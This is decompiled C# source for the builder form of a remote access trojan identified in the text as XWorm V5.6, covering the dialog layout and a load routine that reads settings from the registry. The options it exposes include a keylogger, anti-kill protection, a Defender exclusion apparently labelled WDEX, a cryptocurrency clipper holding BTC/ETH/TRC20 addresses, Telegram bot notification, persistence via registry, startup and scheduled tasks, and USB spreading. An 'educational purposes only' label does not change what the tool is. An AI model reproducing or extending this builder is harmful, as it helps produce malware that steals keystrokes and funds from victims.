		this.Guna2ToggleSwitch3.Size = new System.Drawing.Size(35, 20);
		this.Guna2ToggleSwitch3.TabIndex = 80;
		this.Guna2ToggleSwitch3.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2ToggleSwitch3.UncheckedState.FillColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2ToggleSwitch3.UncheckedState.InnerBorderColor = System.Drawing.Color.White;
		this.Guna2ToggleSwitch3.UncheckedState.InnerColor = System.Drawing.Color.White;
		this.Label16.AutoSize = true;
		this.Label16.Location = new System.Drawing.Point(65, 33);
		this.Label16.Name = "Label16";
		this.Label16.Size = new System.Drawing.Size(38, 13);
		this.Label16.TabIndex = 79;
		this.Label16.Text = "AntiKill";
		this.Guna2ToggleSwitch4.CheckedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ToggleSwitch4.CheckedState.FillColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ToggleSwitch4.CheckedState.InnerBorderColor = System.Drawing.Color.White;
		this.Guna2ToggleSwitch4.CheckedState.InnerColor = System.Drawing.Color.White;
		this.Guna2ToggleSwitch4.Location = new System.Drawing.Point(24, 55);
		this.Guna2ToggleSwitch4.Name = "Guna2ToggleSwitch4";
		this.Guna2ToggleSwitch4.Size = new System.Drawing.Size(35, 20);
		this.Guna2ToggleSwitch4.TabIndex = 82;
		this.Guna2ToggleSwitch4.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2ToggleSwitch4.UncheckedState.FillColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2ToggleSwitch4.UncheckedState.InnerBorderColor = System.Drawing.Color.White;
		this.Guna2ToggleSwitch4.UncheckedState.InnerColor = System.Drawing.Color.White;
		this.Label17.AutoSize = true;
		this.Label17.Location = new System.Drawing.Point(65, 59);
		this.Label17.Name = "Label17";
		this.Label17.Size = new System.Drawing.Size(36, 13);
		this.Label17.TabIndex = 81;
		this.Label17.Text = "WDEX";
		this.Guna2ToggleSwitch5.CheckedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ToggleSwitch5.CheckedState.FillColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ToggleSwitch5.CheckedState.InnerBorderColor = System.Drawing.Color.White;
		this.Guna2ToggleSwitch5.CheckedState.InnerColor = System.Drawing.Color.White;
		this.Guna2ToggleSwitch5.Location = new System.Drawing.Point(112, 29);
		this.Guna2ToggleSwitch5.Name = "Guna2ToggleSwitch5";
		this.Guna2ToggleSwitch5.Size = new System.Drawing.Size(35, 20);
		this.Guna2ToggleSwitch5.TabIndex = 84;
		this.Guna2ToggleSwitch5.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2ToggleSwitch5.UncheckedState.FillColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2ToggleSwitch5.UncheckedState.InnerBorderColor = System.Drawing.Color.White;
		this.Guna2ToggleSwitch5.UncheckedState.InnerColor = System.Drawing.Color.White;
		this.Label18.AutoSize = true;
		this.Label18.Location = new System.Drawing.Point(153, 33);
		this.Label18.Name = "Label18";
		this.Label18.Size = new System.Drawing.Size(58, 13);
		this.Label18.TabIndex = 83;
		this.Label18.Text = "TBotNotify";
		this.Guna2ToggleSwitch6.CheckedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ToggleSwitch6.CheckedState.FillColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ToggleSwitch6.CheckedState.InnerBorderColor = System.Drawing.Color.White;
		this.Guna2ToggleSwitch6.CheckedState.InnerColor = System.Drawing.Color.White;
		this.Guna2ToggleSwitch6.Location = new System.Drawing.Point(224, 29);
		this.Guna2ToggleSwitch6.Name = "Guna2ToggleSwitch6";
		this.Guna2ToggleSwitch6.Size = new System.Drawing.Size(35, 20);
		this.Guna2ToggleSwitch6.TabIndex = 86;
		this.Guna2ToggleSwitch6.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2ToggleSwitch6.UncheckedState.FillColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2ToggleSwitch6.UncheckedState.InnerBorderColor = System.Drawing.Color.White;
		this.Guna2ToggleSwitch6.UncheckedState.InnerColor = System.Drawing.Color.White;
		this.Label19.AutoSize = true;
		this.Label19.Location = new System.Drawing.Point(265, 33);
		this.Label19.Name = "Label19";
		this.Label19.Size = new System.Drawing.Size(40, 13);
		this.Label19.TabIndex = 85;
		this.Label19.Text = "Clipper";
		this.Guna2CheckBox5.AutoSize = true;
		this.Guna2CheckBox5.CheckedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2CheckBox5.CheckedState.BorderRadius = 0;
		this.Guna2CheckBox5.CheckedState.BorderThickness = 0;
		this.Guna2CheckBox5.CheckedState.FillColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2CheckBox5.Location = new System.Drawing.Point(218, 100);
		this.Guna2CheckBox5.Name = "Guna2CheckBox5";
		this.Guna2CheckBox5.Size = new System.Drawing.Size(66, 17);
		this.Guna2CheckBox5.TabIndex = 87;
		this.Guna2CheckBox5.Text = "Registry";
		this.Guna2CheckBox5.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2CheckBox5.UncheckedState.BorderRadius = 0;
		this.Guna2CheckBox5.UncheckedState.BorderThickness = 0;
		this.Guna2CheckBox5.UncheckedState.FillColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2CheckBox6.AutoSize = true;
		this.Guna2CheckBox6.CheckedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2CheckBox6.CheckedState.BorderRadius = 0;
		this.Guna2CheckBox6.CheckedState.BorderThickness = 0;
		this.Guna2CheckBox6.CheckedState.FillColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2CheckBox6.Location = new System.Drawing.Point(364, 100);
		this.Guna2CheckBox6.Name = "Guna2CheckBox6";
		this.Guna2CheckBox6.Size = new System.Drawing.Size(62, 17);
		this.Guna2CheckBox6.TabIndex = 88;
		this.Guna2CheckBox6.Text = "Startup";
		this.Guna2CheckBox6.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2CheckBox6.UncheckedState.BorderRadius = 0;
		this.Guna2CheckBox6.UncheckedState.BorderThickness = 0;
		this.Guna2CheckBox6.UncheckedState.FillColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2CheckBox7.AutoSize = true;
		this.Guna2CheckBox7.CheckedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2CheckBox7.CheckedState.BorderRadius = 0;
		this.Guna2CheckBox7.CheckedState.BorderThickness = 0;
		this.Guna2CheckBox7.CheckedState.FillColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2CheckBox7.Location = new System.Drawing.Point(290, 100);
		this.Guna2CheckBox7.Name = "Guna2CheckBox7";
		this.Guna2CheckBox7.Size = new System.Drawing.Size(68, 17);
		this.Guna2CheckBox7.TabIndex = 89;
		this.Guna2CheckBox7.Text = "Schtasks";
		this.Guna2CheckBox7.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2CheckBox7.UncheckedState.BorderRadius = 0;
		this.Guna2CheckBox7.UncheckedState.BorderThickness = 0;
		this.Guna2CheckBox7.UncheckedState.FillColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2TabControl1.Controls.Add(this.TabPage1);
		this.Guna2TabControl1.Controls.Add(this.TabPage2);
		this.Guna2TabControl1.Controls.Add(this.TabPage3);
		this.Guna2TabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Guna2TabControl1.ImageList = this.ImageList1;
		this.Guna2TabControl1.ItemSize = new System.Drawing.Size(140, 30);
		this.Guna2TabControl1.Location = new System.Drawing.Point(0, 0);
		this.Guna2TabControl1.Name = "Guna2TabControl1";
		this.Guna2TabControl1.SelectedIndex = 0;
		this.Guna2TabControl1.Size = new System.Drawing.Size(447, 282);
		this.Guna2TabControl1.TabButtonHoverState.BorderColor = System.Drawing.Color.Empty;
		this.Guna2TabControl1.TabButtonHoverState.FillColor = System.Drawing.Color.FromArgb(216, 214, 228);
		this.Guna2TabControl1.TabButtonHoverState.Font = new System.Drawing.Font("Segoe UI Semibold", 10f);
		this.Guna2TabControl1.TabButtonHoverState.ForeColor = System.Drawing.Color.White;
		this.Guna2TabControl1.TabButtonHoverState.InnerColor = System.Drawing.Color.FromArgb(216, 214, 228);
		this.Guna2TabControl1.TabButtonIdleState.BorderColor = System.Drawing.Color.Empty;
		this.Guna2TabControl1.TabButtonIdleState.FillColor = System.Drawing.Color.White;
		this.Guna2TabControl1.TabButtonIdleState.Font = new System.Drawing.Font("Segoe UI Semibold", 10f);
		this.Guna2TabControl1.TabButtonIdleState.ForeColor = System.Drawing.Color.Black;
		this.Guna2TabControl1.TabButtonIdleState.InnerColor = System.Drawing.Color.White;
		this.Guna2TabControl1.TabButtonSelectedState.BorderColor = System.Drawing.Color.Empty;
		this.Guna2TabControl1.TabButtonSelectedState.FillColor = System.Drawing.Color.White;
		this.Guna2TabControl1.TabButtonSelectedState.Font = new System.Drawing.Font("Segoe UI Semibold", 10f);
		this.Guna2TabControl1.TabButtonSelectedState.ForeColor = System.Drawing.Color.Black;
		this.Guna2TabControl1.TabButtonSelectedState.InnerColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TabControl1.TabButtonSize = new System.Drawing.Size(140, 30);
		this.Guna2TabControl1.TabIndex = 90;
		this.Guna2TabControl1.TabMenuBackColor = System.Drawing.Color.White;
		this.Guna2TabControl1.TabMenuOrientation = Guna.UI2.WinForms.TabMenuOrientation.HorizontalTop;
		this.TabPage1.BackColor = System.Drawing.Color.White;
		this.TabPage1.Controls.Add(this.Label2);
		this.TabPage1.Controls.Add(this.Guna2TextBox7);
		this.TabPage1.Controls.Add(this.ListBox1);
		this.TabPage1.Controls.Add(this.Label12);
		this.TabPage1.Controls.Add(this.Label3);
		this.TabPage1.Controls.Add(this.Guna2TextBox4);
		this.TabPage1.Controls.Add(this.Label1);
		this.TabPage1.Controls.Add(this.Guna2TextBox2);
		this.TabPage1.Controls.Add(this.Guna2CheckBox3);
		this.TabPage1.Controls.Add(this.Label9);
		this.TabPage1.Controls.Add(this.Guna2TextBox1);
		this.TabPage1.Controls.Add(this.Label10);
		this.TabPage1.Controls.Add(this.Guna2TextBox3);
		this.TabPage1.ImageKey = "icons8-network-48.png";
		this.TabPage1.Location = new System.Drawing.Point(4, 34);
		this.TabPage1.Name = "TabPage1";
		this.TabPage1.Padding = new System.Windows.Forms.Padding(3);
		this.TabPage1.Size = new System.Drawing.Size(439, 244);
		this.TabPage1.TabIndex = 0;
		this.TabPage1.Text = "Connection";
		this.Label2.AutoSize = true;
		this.Label2.Font = new System.Drawing.Font("Tahoma", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label2.ForeColor = System.Drawing.Color.Black;
		this.Label2.Location = new System.Drawing.Point(38, 160);
		this.Label2.Name = "Label2";
		this.Label2.Size = new System.Drawing.Size(43, 13);
		this.Label2.TabIndex = 95;
		this.Label2.Text = "Group :";
		this.Guna2TextBox7.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox7.BorderRadius = 3;
		this.Guna2TextBox7.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox7.DefaultText = "XWorm V5.6";
		this.Guna2TextBox7.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox7.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox7.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox7.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox7.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox7.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox7.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox7.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox7.Location = new System.Drawing.Point(87, 157);
		this.Guna2TextBox7.Name = "Guna2TextBox7";
		this.Guna2TextBox7.PasswordChar = '\0';
		this.Guna2TextBox7.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox7.PlaceholderText = "";
		this.Guna2TextBox7.SelectedText = "";
		this.Guna2TextBox7.Size = new System.Drawing.Size(307, 21);
		this.Guna2TextBox7.TabIndex = 94;
		this.TabPage2.BackColor = System.Drawing.Color.White;
		this.TabPage2.Controls.Add(this.Guna2TextBox6);
		this.TabPage2.Controls.Add(this.Guna2CheckBox8);
		this.TabPage2.Controls.Add(this.Guna2ComboBox2);
		this.TabPage2.Controls.Add(this.Guna2TextBox5);
		this.TabPage2.Controls.Add(this.Guna2ToggleSwitch3);
		this.TabPage2.Controls.Add(this.Guna2CheckBox7);
		this.TabPage2.Controls.Add(this.Label14);
		this.TabPage2.Controls.Add(this.Guna2CheckBox6);
		this.TabPage2.Controls.Add(this.Guna2CheckBox5);
		this.TabPage2.Controls.Add(this.Guna2ToggleSwitch1);
		this.TabPage2.Controls.Add(this.Label15);
		this.TabPage2.Controls.Add(this.Guna2ToggleSwitch6);
		this.TabPage2.Controls.Add(this.Guna2ToggleSwitch2);
		this.TabPage2.Controls.Add(this.Label19);
		this.TabPage2.Controls.Add(this.Label16);
		this.TabPage2.Controls.Add(this.Guna2ToggleSwitch5);
		this.TabPage2.Controls.Add(this.Label17);
		this.TabPage2.Controls.Add(this.Label18);
		this.TabPage2.Controls.Add(this.Guna2ToggleSwitch4);
		this.TabPage2.Controls.Add(this.Guna2NumericUpDown1);
		this.TabPage2.Controls.Add(this.Label13);
		this.TabPage2.ImageKey = "icons8_msdf3aintenance_32.png";
		this.TabPage2.Location = new System.Drawing.Point(4, 34);
		this.TabPage2.Name = "TabPage2";
		this.TabPage2.Padding = new System.Windows.Forms.Padding(3);
		this.TabPage2.Size = new System.Drawing.Size(439, 244);
		this.TabPage2.TabIndex = 1;
		this.TabPage2.Text = "Settings";
		this.Guna2TextBox6.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox6.BorderRadius = 3;
		this.Guna2TextBox6.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox6.DefaultText = "USB.exe";
		this.Guna2TextBox6.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox6.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox6.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox6.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox6.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox6.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox6.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox6.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox6.Location = new System.Drawing.Point(218, 199);
		this.Guna2TextBox6.Name = "Guna2TextBox6";
		this.Guna2TextBox6.PasswordChar = '\0';
		this.Guna2TextBox6.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox6.PlaceholderText = "";
		this.Guna2TextBox6.SelectedText = "";
		this.Guna2TextBox6.Size = new System.Drawing.Size(205, 21);
		this.Guna2TextBox6.TabIndex = 93;
		this.Guna2CheckBox8.AutoSize = true;
		this.Guna2CheckBox8.CheckedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2CheckBox8.CheckedState.BorderRadius = 0;
		this.Guna2CheckBox8.CheckedState.BorderThickness = 0;
		this.Guna2CheckBox8.CheckedState.FillColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2CheckBox8.Location = new System.Drawing.Point(218, 177);
		this.Guna2CheckBox8.Name = "Guna2CheckBox8";
		this.Guna2CheckBox8.Size = new System.Drawing.Size(45, 17);
		this.Guna2CheckBox8.TabIndex = 92;
		this.Guna2CheckBox8.Text = "USB";
		this.Guna2CheckBox8.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2CheckBox8.UncheckedState.BorderRadius = 0;
		this.Guna2CheckBox8.UncheckedState.BorderThickness = 0;
		this.Guna2CheckBox8.UncheckedState.FillColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2ComboBox2.BackColor = System.Drawing.Color.Transparent;
		this.Guna2ComboBox2.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox2.BorderRadius = 3;
		this.Guna2ComboBox2.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
		this.Guna2ComboBox2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.Guna2ComboBox2.FocusedColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox2.FocusedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox2.Font = new System.Drawing.Font("Segoe UI", 8.25f);
		this.Guna2ComboBox2.ForeColor = System.Drawing.Color.Black;
		this.Guna2ComboBox2.ItemHeight = 15;
		this.Guna2ComboBox2.Items.AddRange(new object[6] { "%AppData%", "%Temp%", "%LocalAppData%", "%Userprofile%", "%Public%", "%ProgramData%" });
		this.Guna2ComboBox2.Location = new System.Drawing.Point(218, 123);
		this.Guna2ComboBox2.Name = "Guna2ComboBox2";
		this.Guna2ComboBox2.Size = new System.Drawing.Size(208, 21);
		this.Guna2ComboBox2.TabIndex = 91;
		this.Guna2TextBox5.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox5.BorderRadius = 3;
		this.Guna2TextBox5.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox5.DefaultText = "XClient.exe";
		this.Guna2TextBox5.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox5.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox5.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox5.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox5.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox5.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox5.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox5.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox5.Location = new System.Drawing.Point(218, 150);
		this.Guna2TextBox5.Name = "Guna2TextBox5";
		this.Guna2TextBox5.PasswordChar = '\0';
		this.Guna2TextBox5.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox5.PlaceholderText = "";
		this.Guna2TextBox5.SelectedText = "";
		this.Guna2TextBox5.Size = new System.Drawing.Size(208, 21);
		this.Guna2TextBox5.TabIndex = 90;
		this.Guna2NumericUpDown1.BackColor = System.Drawing.Color.Transparent;
		this.Guna2NumericUpDown1.BorderRadius = 3;
		this.Guna2NumericUpDown1.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2NumericUpDown1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2NumericUpDown1.Location = new System.Drawing.Point(93, 150);
		this.Guna2NumericUpDown1.Maximum = new decimal(new int[4] { 999, 0, 0, 0 });
		this.Guna2NumericUpDown1.Minimum = new decimal(new int[4] { 3, 0, 0, 0 });
		this.Guna2NumericUpDown1.Name = "Guna2NumericUpDown1";
		this.Guna2NumericUpDown1.Size = new System.Drawing.Size(70, 25);
		this.Guna2NumericUpDown1.TabIndex = 73;
		this.Guna2NumericUpDown1.UpDownButtonFillColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2NumericUpDown1.Value = new decimal(new int[4] { 3, 0, 0, 0 });
		this.Label13.AutoSize = true;
		this.Label13.Font = new System.Drawing.Font("Tahoma", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label13.ForeColor = System.Drawing.Color.Black;
		this.Label13.Location = new System.Drawing.Point(20, 154);
		this.Label13.Name = "Label13";
		this.Label13.Size = new System.Drawing.Size(67, 13);
		this.Label13.TabIndex = 72;
		this.Label13.Text = "Sleep / Sec :";
		this.TabPage3.BackColor = System.Drawing.Color.White;
		this.TabPage3.Controls.Add(this.PictureBox2);
		this.TabPage3.Controls.Add(this.Label4);
		this.TabPage3.Controls.Add(this.PictureBox4);
		this.TabPage3.Controls.Add(this.Label20);
		this.TabPage3.Controls.Add(this.Guna2CheckBox4);
		this.TabPage3.Controls.Add(this.Guna2GradientButton1);
		this.TabPage3.Controls.Add(this.PictureBox1);
		this.TabPage3.Controls.Add(this.Guna2CheckBox1);
		this.TabPage3.Controls.Add(this.Guna2CheckBox2);
		this.TabPage3.ImageKey = "icons8-creating-48.png";
		this.TabPage3.Location = new System.Drawing.Point(4, 34);
		this.TabPage3.Name = "TabPage3";
		this.TabPage3.Padding = new System.Windows.Forms.Padding(3);
		this.TabPage3.Size = new System.Drawing.Size(439, 244);
		this.TabPage3.TabIndex = 2;
		this.TabPage3.Text = "Build";
		this.PictureBox2.Image = (System.Drawing.Image)resources.GetObject("PictureBox2.Image");
		this.PictureBox2.Location = new System.Drawing.Point(15, 65);
		this.PictureBox2.Name = "PictureBox2";
		this.PictureBox2.Size = new System.Drawing.Size(25, 23);
		this.PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.PictureBox2.TabIndex = 78;
		this.PictureBox2.TabStop = false;
		this.Label4.AutoSize = true;
		this.Label4.Font = new System.Drawing.Font("Tahoma", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label4.ForeColor = System.Drawing.Color.Black;
		this.Label4.Location = new System.Drawing.Point(46, 70);
		this.Label4.Name = "Label4";
		this.Label4.Size = new System.Drawing.Size(346, 26);
		this.Label4.TabIndex = 77;
		this.Label4.Text = "This program was created for educational purposes only \r\nyou are responsible for your actions,once you use it you agree to this.";
		this.PictureBox4.Image = (System.Drawing.Image)resources.GetObject("PictureBox4.Image");
		this.PictureBox4.Location = new System.Drawing.Point(15, 36);
		this.PictureBox4.Name = "PictureBox4";
		this.PictureBox4.Size = new System.Drawing.Size(25, 23);
		this.PictureBox4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.PictureBox4.TabIndex = 76;
		this.PictureBox4.TabStop = false;
		this.Label20.AutoSize = true;
		this.Label20.Font = new System.Drawing.Font("Tahoma", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label20.ForeColor = System.Drawing.Color.Black;
		this.Label20.Location = new System.Drawing.Point(46, 41);
		this.Label20.Name = "Label20";
		this.Label20.Size = new System.Drawing.Size(337, 13);
		this.Label20.TabIndex = 75;
		this.Label20.Text = "Payload size changes based on your choice of settings and features!";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(447, 282);
		base.Controls.Add(this.Guna2TabControl1);
		this.ForeColor = System.Drawing.Color.Black;
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.MaximizeBox = false;
		base.MinimizeBox = false;
		base.Name = "Builder";
		base.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide;
		this.Text = "Builder";
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).EndInit();
		this.Guna2TabControl1.ResumeLayout(false);
		this.TabPage1.ResumeLayout(false);
		this.TabPage1.PerformLayout();
		this.TabPage2.ResumeLayout(false);
		this.TabPage2.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.Guna2NumericUpDown1).EndInit();
		this.TabPage3.ResumeLayout(false);
		this.TabPage3.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox2).EndInit();
		((System.ComponentModel.ISupportInitialize)this.PictureBox4).EndInit();
		base.ResumeLayout(false);
	}

	public Builder()
	{
		base.Load += Builder_Load;
		bool_0 = false;
		bool_1 = false;
		InitializeComponent();

        this.ImageList1.Images.SetKeyName(0, "icons8-connection-48.png");
        this.ImageList1.Images.SetKeyName(1, "icons8_msdf3aintenance_32.png");
        this.ImageList1.Images.SetKeyName(2, "icons8-new-property-48.png");
        this.ImageList1.Images.SetKeyName(3, "icons8-creating-48.png");
        this.ImageList1.Images.SetKeyName(4, "icons8-network-48.png");
        base.Opacity = 0.0;
		Module0.smethod_18(this, 20);
	}

	private void Builder_Load(object sender, EventArgs e)
	{
		try
		{
			if (Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Assembly", null), null, TextCompare: false), Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Assembly", null), "False", TextCompare: false))))
			{
				string_1 = null;
				Guna2CheckBox1.Checked = false;
			}
			else
			{
				string_1 = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Assembly", null));
				bool_0 = true;
				Guna2CheckBox1.Checked = true;
			}
			if (Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Icon", null), null, TextCompare: false), Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Icon", null), "False", TextCompare: false))))
			{
				string_0 = null;
				Guna2CheckBox2.Checked = false;
				PictureBox1.Image = null;
			}
			else
			{
				string_0 = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Icon", null));
				bool_1 = true;
				Guna2CheckBox2.Checked = true;
				PictureBox1.ImageLocation = string_0;
			}
			if (Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "InstallDir", null), null, TextCompare: false), Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "InstallDir", null), "False", TextCompare: false))))
			{
				Guna2ComboBox2.Enabled = false;
				Guna2TextBox5.Enabled = false;
				Guna2ComboBox2.SelectedIndex = 0;
			}
			else
			{
				Guna2ComboBox2.SelectedIndex = Convert.ToInt32(RuntimeHelpers.GetObjectValue(MyProject.Computer.Registry.GetValue(GClass19.string_4, "InstallDir", null)));
				Guna2ComboBox2.Enabled = true;
				Guna2TextBox5.Enabled = true;
			}
			if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "InstallStr", null), null, TextCompare: false))))
			{
				Guna2TextBox5.Text = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "InstallStr", null));
			}
			if (Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Clipper", null), null, TextCompare: false), Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Clipper", null), "False", TextCompare: false))))
			{
				Guna2ToggleSwitch6.Checked = false;
			}
			else
			{
				string_4 = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "BTC", null));
				string_5 = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "ETH", null));
				string_6 = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "TRC20", null));
				Guna2ToggleSwitch6.Checked = true;
			}
			if (Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "TBotNotify", null), null, TextCompare: false), Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "TBotNotify", null), "False", TextCompare: false))))
			{
				Guna2ToggleSwitch5.Checked = false;
			}
			else
			{
				string_3 = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "BotToken", null));
				string_2 = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Botid", null));
				Guna2ToggleSwitch5.Checked = true;
			}
			if (Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Keylogger", null), "True", TextCompare: false))
			{
				Guna2ToggleSwitch2.Checked = true;
			}
			else
			{
				Guna2ToggleSwitch2.Checked = false;
			}
			if (Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "AntiKill", null), "True", TextCompare: false))
			{
				Guna2ToggleSwitch3.Checked = true;
			}
			else
			{
				Guna2ToggleSwitch3.Checked = false;
			}
			if (Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "WDEX", null), "True", TextCompare: false))
			{
				Guna2ToggleSwitch4.Checked = true;
			}
			else
			{
				Guna2ToggleSwitch4.Checked = false;
			}
